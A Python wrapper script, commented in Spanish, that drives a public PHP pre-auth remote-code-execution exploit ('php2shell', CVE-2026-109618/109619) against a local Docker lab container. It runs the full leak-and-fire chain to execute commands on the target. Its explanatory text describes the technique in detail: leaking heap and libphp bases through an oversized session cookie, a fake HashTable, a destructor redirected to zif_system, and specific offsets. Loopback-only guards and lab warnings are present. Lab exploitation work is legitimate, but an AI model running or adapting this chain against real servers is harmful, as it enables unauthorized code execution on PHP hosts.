#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
php2shell_rce.py — wrapper de laboratorio sobre el exploit RCE publico
=======================================================================

CVE-2026-109618 / CVE-2026-109619 ("php2shell") — PHP pre-auth RCE.

Ejecuta la cadena RCE completa (leak de heap via HTTP -> despertar de ASLR
por filtracion -> HashTable falsa -> zif_system) contra el servicio
`rce-target` de ESTE laboratorio, usando el exploit publico verificado
vendido en lab/vendor/php2shell-exp (commit fijado; ver EXPLOTACION.md).

    python3 scripts/php2shell_rce.py --info          # reconocimiento del target
    python3 scripts/php2shell_rce.py --check         # ¿el target es el build calibrado?
    python3 scripts/php2shell_rce.py -c "id"         # cadena completa: uid=33 en pantalla
    python3 scripts/php2shell_rce.py -c "id" --explain  # + narracion de cada fase

GATING (por diseño, no negociable):
  * Solo loopback (127.0.0.0/8 / ::1). El objetivo solo publica en 127.0.0.1.
  * Preflight de identidad: el endpoint /t.php debe responder con el marker
    "PHP_RFC1867_RCE_TARGET_V1" y PHP 8.5.11 — sin marker, no se dispara nada.
  * Uso exclusivo en entorno aislado de laboratorio (aviso legal en cada uso).
  * Comandos <= 14 bytes ASCII (limite fisico del carrier; ver EXPLOTACION.md).

USO EXCLUSIVO EN ENTORNO AISLADO DE LABORATORIO CONTRA CONTENEDORES PROPIOS.
"""

from __future__ import annotations

import argparse
import json
import re
import subprocess
import sys
import urllib.request
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
VENDOR = ROOT / "lab" / "vendor" / "php2shell-exp"
EXPLOIT = VENDOR / "tools" / "php2shell_stock_poc.py"
VENDOR_COMMIT = "b1e419912219691417c72b122f6eb410b938eee7"
VENDOR_REPO = "https://github.com/dinosn/php-cve-2026-10961x-lab-poc"

DEFAULT_URL = "http://127.0.0.1:18081/t.php"
REQUIRED_MARKER = "PHP_RFC1867_RCE_TARGET_V1"
REQUIRED_PHP = "8.5.11"
MAX_CMD_BYTES = 14

C_RESET, C_BOLD, C_DIM = "\033[0m", "\033[1m", "\033[2m"
C_CYAN, C_GREEN, C_YELLOW, C_RED = "\033[36m", "\033[32m", "\033[33m", "\033[31m"


def banner(text: str) -> None:
    print(f"\n{C_BOLD}{C_CYAN}== {text} =={C_RESET}")


def note(text: str) -> None:
    print(f"{C_DIM}  {text}{C_RESET}")


def ok(text: str) -> None:
    print(f"{C_GREEN}[✓]{C_RESET} {text}")


def warn(text: str) -> None:
    print(f"{C_YELLOW}[!]{C_RESET} {text}")


def die(text: str, code: int = 2) -> "None":
    print(f"{C_RED}[✗] {text}{C_RESET}", file=sys.stderr)
    sys.exit(code)


# ---------------------------------------------------------------------------
# Gating
# ---------------------------------------------------------------------------

def guard_loopback(url: str) -> None:
    """Solo se dispara contra loopback. Sin excepciones."""
    m = re.match(r"^https?://\[?([0-9.:a-fA-F]+)\]?", url)
    host = m.group(1) if m else ""
    if host.startswith("127.") or host in ("::1", "localhost"):
        return
    die(f"refusing non-loopback target '{url}' — este wrapper solo opera contra\n"
        "     el laboratorio local (127.0.0.1:18081). Cambia la URL a loopback.")


def guard_vendor() -> None:
    if EXPLOIT.is_file():
        return
    die(f"no se encuentra el exploit vendido en {VENDOR}\n"
        f"     Descargalo con:\n"
        f"       git clone --depth 1 {VENDOR_REPO} {VENDOR}\n"
        f"       cd {VENDOR} && git checkout {VENDOR_COMMIT}\n"
        f"     (ver 'make vendor-exploit' en el Makefile)\n"
        f"     y levanta el objetivo con: make rce-target")


# ---------------------------------------------------------------------------
# Preflight de identidad del target
# ---------------------------------------------------------------------------

RCE_CONTAINER = "php2shell-rce-target"
RCE_IMAGE_DIGEST = (
    "sha256:974e3a920309308e1690ed607e6cc3061d6906f90cc8d30fe519daa48bccf101"
)


def target_identity(url: str, timeout: float = 5.0) -> dict:
    """Identidad del target SIN hacer ninguna peticion HTTP.

    Por que sin HTTP: la fase de fire esta calibrada sobre la geometria
    exacta del heap del worker y CUALQUIER request previo (incluso un
    JSON estatico servido por Apache) desplaza el heap y el carrier no
    aterriza (verificado: fire 0/5 con preflight HTTP vs 4/4 sin el).
    La identidad se comprueba por docker:
      * digest de la imagen del contenedor (build calibrado, offsets OK)
      * lab/rce/www/identity.json leido con docker exec (marker + version)
    """
    import shutil
    docker = shutil.which("docker")
    if not docker:
        die("docker CLI no disponible: no puedo verificar la identidad sin HTTP\n"
            "     y un preflight HTTP rompe la ventana del fire. Abortando.")
    image = subprocess.run(
        [docker, "inspect", "-f", "{{.Image}}", RCE_CONTAINER],
        capture_output=True, text=True,
    ).stdout.strip()
    if not image:
        die(f"contenedor {RCE_CONTAINER} no esta corriendo\n"
            "     levantalo con: make rce-target")
    if image != RCE_IMAGE_DIGEST:
        die(f"la imagen del contenedor NO es el build calibrado\n"
            f"     actual : {image[:19]}...\n"
            f"     esperada: {RCE_IMAGE_DIGEST[:19]}...\n"
            "     los offsets del exploit solo valen para el build fijado.\n"
            "     Recrea el objetivo: make rce-target")
    ident = subprocess.run(
        [docker, "exec", RCE_CONTAINER, "cat", "/var/www/html/identity.json"],
        capture_output=True, text=True,
    ).stdout
    try:
        data = json.loads(ident)
    except json.JSONDecodeError:
        die("lab/rce/www/identity.json no es el fichero de identidad esperado")
    return data


def check_target(url: str, quiet: bool = False) -> dict:
    data = target_identity(url)
    marker = data.get("marker")
    version = data.get("php")
    if marker != REQUIRED_MARKER:
        die(f"marker del target no reconocido: {marker!r}\n"
            "     Esperaba PHP_RFC1867_RCE_TARGET_V1 (lab/rce/www). No se dispara nada.")
    if version != REQUIRED_PHP:
        die(f"version PHP inesperada: {version!r} (esperaba {REQUIRED_PHP})")
    if not quiet:
        ok(f"target identificado: {REQUIRED_MARKER}, PHP {version} (fixed: 8.5.12)")
        note("preflight por docker (digest de imagen + identity.json):")
        note("cero peticiones HTTP antes de la cadena — el heap queda intacto")
    return data


# ---------------------------------------------------------------------------
# Modo --check: ¿es este build el calibrado? (sin enviar el par de fire)
# ---------------------------------------------------------------------------

def mode_check(url: str) -> int:
    banner("CHECK — identidad + oracle de leak (sin fire)")
    check_target(url)
    note("modo seguro: solo la fase de leak; el par de fire NUNCA se envia")
    rc = run_exploit(["--stage", "leak", "--url", url], tail=8)
    return rc


# ---------------------------------------------------------------------------
# Modo --info: reconocimiento puro (version + build fingerprint)
# ---------------------------------------------------------------------------

def mode_info(url: str) -> int:
    banner("INFO — reconocimiento del target")
    # --info no dispara nada: puede permitirse un GET PHP (health.php)
    # para mostrar identidad dinamica (pid del worker, config real).
    # OJO: si pretendes encadenar un disparo justo despues, recrea el
    # contenedor (make rce-target): este GET desplaza el heap del worker.
    try:
        with urllib.request.urlopen(url, timeout=5) as r:
            data = json.loads(r.read().decode("utf-8", "replace"))
        print(json.dumps(data, indent=2, ensure_ascii=False))
    except Exception as e:  # noqa: BLE001
        note(f"health.php no disponible ({e}); uso la identidad estática")
        data = target_identity(url)
        print(json.dumps(data, indent=2, ensure_ascii=False))
    print()
    ok(f"PHP {data.get('version')} — rama vulnerable (fixed en 8.5.12)")
    note("¿vulnerable por version? -> SI (8.5.11, pre-patch)")
    note("¿cadena RCE aplicable?    -> depende del BUILD exacto (ver --check)")
    note("un mismo tag de imagen puede traer snapshots distintos de libphp;")
    note("los offsets (zif_system @ libphp+0x5996e0) solo valen para el build calibrado.")
    return 0


# ---------------------------------------------------------------------------
# Motor: invoca el exploit vendido
# ---------------------------------------------------------------------------

def run_exploit(extra: list[str], tail: int = 40, stream: bool = True) -> int:
    cmd = [sys.executable, str(EXPLOIT)] + extra
    proc = subprocess.run(cmd, capture_output=not stream, text=True, timeout=420)
    if stream:
        return proc.returncode
    lines = (proc.stdout + proc.stderr).splitlines()
    for line in lines[-tail:]:
        print(f"    {line}")
    return proc.returncode


EXPLAIN = {
    "pre":  "FASE 1-2  Leak: POST multipart con chunked (~129 MB) fuerza el OOM DENTRO de\n"
            "          php_session_send_cookie -> php_url_encode. PS(id) queda colgando y\n"
            "          PS(send_cookie)=1. La respuesta devuelve una cookie de ~600 KB que\n"
            "          decodifica AMBAS bases de una vez (punteros alineados a 2 MiB ->\n"
            "          chunk base; valores repetidos de zval_ptr_dtor -> base de libphp).\n"
            "          ASLR cae por FILTRACION, no por fuerza bruta.",
    "fire": "FASE 3-4  Fire: productor recalibrado (66 pad fields) mueve el slot de\n"
            "          referencia a una pagina bin-56; 800 portadores vivos de 31 bytes y\n"
            "          una HashTable falsa en chunk+0xB30D8 hacen que el cleanup ejecute\n"
            "          pDestructor = zif_system con tu comando (<=14 bytes).\n"
            "          El worker muere DESPUES de ejecutar (la prueba se escribe primero).",
}


def mode_rce(url: str, cmd: str, expect: str, explain: bool, quiet: bool) -> int:
    banner("RCE — cadena completa (leak + fire)")
    check_target(url, quiet=quiet)
    cmd = cmd.strip()
    if not cmd or not cmd.isascii():
        die(f"comando invalido: {cmd!r} (solo ASCII)")
    if re.search(r"[;&|`$<>\"']", cmd):
        die("el comando no puede contener metacaracteres de shell (;&|`$<>\"'), solo la forma\n"
            "     simple 'prog args'. El wrapper anade la redireccion de salida automaticamente.")
    if len(cmd.encode()) > MAX_CMD_BYTES - 2:  # dejamos sitio para '>o'
        die(f"comando demasiado largo: {cmd!r} (<= {MAX_CMD_BYTES - 2} bytes; con la redireccion\n"
            f"     '>o' debe caber en {MAX_CMD_BYTES}; limite fisico del carrier; ver EXPLOTACION.md §5)")
    # El tool ejecuta el comando VERBATIM: la prueba se recupera por HTTP, asi
    # que el comando necesita redirigir su salida al docroot. Lo hace el wrapper.
    out_name = "o"
    cmd = f"{cmd}>{out_name}"
    fetch = "/" + out_name
    assert len(cmd.encode()) <= MAX_CMD_BYTES

    if explain:
        print(EXPLAIN["pre"])
        print()
    warn("USO EXCLUSIVO EN LABORATORIO AISLADO — contenedor propio")
    # Prueba residual de una ejecución anterior: el exploit se niega a
    # aceptar un veredicto viejo ('proof already present'). La limpiamos
    # para que cada disparo produzca evidencia fresca.
    stale = ROOT / "lab" / "rce" / "www" / "o"
    if stale.exists():
        stale.unlink()
        note("eliminada prueba residual de una ejecución anterior (lab/rce/www/o)")
    if not quiet:
        note(f"comando efectivo: sh -c {cmd!r}  (salida en el docroot, recuperada por HTTP)")

    # Pre-chequeo barato: cada boot del contenedor tiene una geometria de mmap
    # fija ('buena' o 'mala' para la ventana de plausibilidad del exploit).
    # Un leak-only (~15 s) lo mide; si el boot es malo, no gastamos la cadena
    # completa (~35 s) y el Makefile recrea el contenedor.
    if not quiet:
        note("FASE 1-2 (probar): midiendo la geometria de este boot (leak sin fire)...")
    probe = subprocess.run(
        [sys.executable, str(EXPLOIT), "--stage", "leak", "--url", url,
         "--php", REQUIRED_PHP],
        capture_output=True, text=True, timeout=180,
    )
    probe_out = probe.stdout + probe.stderr
    leak_m = re.search(r"LEAK heap=(0x[0-9a-f]+) libphp=(0x[0-9a-f]+)", probe_out)
    if probe.returncode != 0 or not leak_m:
        delta = re.search(r"delta (0x-?[0-9a-f]+)", probe_out)
        why = f" (delta {delta.group(1)} fuera de la ventana del exploit)" if delta else ""
        warn(f"boot con geometria no apta{why} — recreando contenedor...")
        return 1
    heap, module = leak_m.group(1), leak_m.group(2)
    if not quiet:
        ok(f"boot apto: leak aceptado (chunk={heap} libphp={module})")

    # Disparo UNICO con bases explicitas: cada fire fallido segfaultea el
    # worker y deja el heap del siguiente en un estado donde ya no aterriza
    # (verificado empiricamente). Un intento por contenedor, fresco cada vez.
    args = [
        "--stage", "fire",
        "--heap", heap,
        "--module", module,
        "--url", url,
        "--cmd", cmd,
        "--fetch", fetch,
        "--expect", expect,
        "--php", REQUIRED_PHP,
    ]
    proc = subprocess.run(
        [sys.executable, str(EXPLOIT)] + args,
        capture_output=True, text=True, timeout=420,
    )
    out = proc.stdout + proc.stderr

    # Narracion de lo observado (parse del output del exploit)
    leak = re.search(r"LEAK heap=(0x[0-9a-f]+) libphp=(0x[0-9a-f]+)", out)
    fire = re.search(r"FIRE (\d)/(\d+)(.*)", out)
    result = re.search(r"RESULT fire=(\d)", out)

    if leak:
        note(f"FASE 1-2 leak: chunk base={leak.group(1)}  libphp base={leak.group(2)}")
        note("ASLR vencido: direcciones reales de ESTE proceso, filtradas por Set-Cookie")
    if explain and fire:
        print()
        print(EXPLAIN["fire"])
        print()
    if fire:
        ok(f"FASE 3-4 fire: intentos {fire.group(1)}/{fire.group(2)}{fire.group(3)}")

    # La prueba: el tool solo reporta el booleano ('uid proof present'),
    # el contenido queda en el docroot (bind del host). Lo leemos del host.
    proof = None
    m = re.search(r"uid=\d+\([^)]*\)[^\n]*", out)
    if m:
        proof = m.group(0).strip()
    else:
        proof_path = ROOT / "lab" / "rce" / "www" / out_name
        if proof_path.exists():
            try:
                content = proof_path.read_text(errors="replace")
                if expect in content:
                    line = next(l for l in content.splitlines() if expect in l)
                    proof = line.strip()
            except OSError:
                pass

    if proof:
        width = max(46, len(proof) + 2)
        print()
        print(f"{C_BOLD}{C_GREEN}╔{'═' * width}╗")
        print(f"║  RCE CONFIRMADA — ejecucion como:{' ' * (width - 34)}║")
        print(f"║  {proof:<{width - 2}}║")
        print(f"╚{'═' * width}╝{C_RESET}")
        if result and result.group(1) == "1":
            note("veredicto del exploit: fire=1 (prueba escrita y recuperada)")
        if explain:
            print()
            note("Lo que acaba de pasar, en una linea: la destruccion 'ordenada' de la")
            note("sesion por parte de PHP ejecuto un destructor FALSO colocado por el")
            note("atacante; ese destructor era zif_system; system() corrio TU comando.")
        return 0

    # Sin prueba: diagnostico honesto
    print()
    if result and result.group(1) == "0":
        warn("la cadena se disparo pero no hubo prueba recuperable (fire=0).")
        note("causas tipicas: leak valido pero el worker no ejecuto el carrier, o el")
        note("comando no escribio la salida donde se esperaba. Reintenta: la geometria")
        note("del heap depende de la aleatoriedad de esta generacion ASLR.")
    elif "proof already present" in out:
        warn("el exploit encontro una prueba PREVIA en el target y se nego a disparar")
        note("(se protege contra veredictos viejos). Elimina lab/rce/www/o y reintenta.")
    elif not leak:
        warn("leak fallido en esta generacion ASLR (el propio autor documenta 2/3-3/3 por target).")
        note("reintenta: cada ejecucion es una nueva generacion de ASLR.")
    else:
        warn("la cadena se ejecuto sin prueba verificable en esta generacion ASLR.")
        note("reintenta con contenedor fresco: make rce")
    if not quiet:
        print()
        for line in out.splitlines()[-12:]:
            print(f"    {line}")
    return 1


# ---------------------------------------------------------------------------

def main() -> int:
    ap = argparse.ArgumentParser(
        description="php2shell RCE de laboratorio (CVE-2026-109618/109619) — solo loopback",
        epilog="USO EXCLUSIVO EN ENTORNO AISLADO DE LABORATORIO. Documentacion: EXPLOTACION.md",
    )
    ap.add_argument("-c", "--cmd", metavar="CMD", help='comando a ejecutar en el target (<=14 bytes ASCII)')
    ap.add_argument("--info", action="store_true", help="reconocimiento: version + identidad del target")
    ap.add_argument("--check", action="store_true", help="identidad + oracle de leak (sin fire)")
    ap.add_argument("--explain", action="store_true", help="narracion didactica de cada fase durante la ejecucion")
    ap.add_argument("-u", "--url", default=DEFAULT_URL, help=f"target (default: {DEFAULT_URL})")
    ap.add_argument("--expect", default="uid=", help="cadena esperada en la prueba (default: uid=)")
    ap.add_argument("--quiet", action="store_true", help="menos output (para grabar)")
    args = ap.parse_args()

    guard_loopback(args.url)
    guard_vendor()

    if args.info:
        return mode_info(args.url)
    if args.check:
        return mode_check(args.url)
    if args.cmd:
        return mode_rce(args.url, args.cmd, args.expect, args.explain, args.quiet)
    ap.print_help()
    return 0


if __name__ == "__main__":
    sys.exit(main())
